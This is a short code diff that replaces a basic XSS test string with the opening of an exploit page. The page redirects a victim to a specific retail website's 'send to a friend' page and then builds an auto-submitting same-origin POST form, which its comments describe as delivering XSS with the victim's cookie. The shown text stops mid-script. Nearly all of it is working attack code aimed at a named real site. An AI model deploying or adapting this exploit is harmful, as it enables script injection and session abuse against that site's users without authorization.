@@ -1,1 +1,9 @@
-<img src=x onerror=alert(1)>
+<html><body><script>
+// Step 1: Navigate victim to target (sets cookie as 1st-party)
+if (location.hostname !== 'ws-fr.norma-online.de') {
+    location.href = 'https://ws-fr.norma-online.de/fr/envoyer-a-une-amie/bonnes-affaires/a-saisir-lundi,-17.08.26/';
+} else {
+    // Step 2: We're on target — auto-submit XSS (same-origin, cookie included)
+    const f = document.createElement('form');
+    f.method = 'POST';
+    f.action = location.href;
